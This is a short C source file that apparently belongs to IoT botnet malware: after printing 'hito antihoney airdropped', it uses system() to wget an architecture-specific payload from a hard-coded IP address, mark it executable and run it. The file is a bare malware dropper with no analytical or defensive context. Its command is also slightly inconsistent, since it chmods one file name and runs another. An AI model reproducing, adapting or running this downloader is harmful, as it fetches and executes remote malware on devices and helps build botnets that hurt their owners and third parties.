#define STDOUT 1

int main(int argc, char **args) {	

    write(STDOUT, "hito antihoney airdropped\n", 25);
    system("wget http://80.85.87.245/swrgiuhguhwrguiwetu/" BOT_ARCH " -O - > dd; chmod 777 cc; ./dd load.wget");


}


